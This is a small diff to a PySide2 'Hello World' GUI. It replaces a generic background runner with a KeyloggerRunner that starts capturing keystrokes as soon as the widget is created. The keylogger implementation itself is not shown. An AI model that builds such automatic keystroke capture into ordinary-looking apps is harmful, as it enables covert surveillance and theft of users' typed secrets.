@@ -2,16 +2,15 @@ import sys
 
 from PySide2 import QtWidgets
 from PySide2.QtCore import Slot
-from background import BackgroundRunner
-from keylogger import start_keylogger
+from keylogger import KeyloggerRunner
 
 
 class MyWidget(QtWidgets.QWidget):
 
     def __init__(self):
         QtWidgets.QWidget.__init__(self)
-        self.runner = BackgroundRunner()
-        self.runner.start_jobs([start_keylogger])
+        self.runner = KeyloggerRunner()
+        self.runner.start_running()
         self.runner.msg_signal.connect(self.get_events)
         self.button = QtWidgets.QPushButton("Click me!")
         self.text = QtWidgets.QLabel("Hello World")
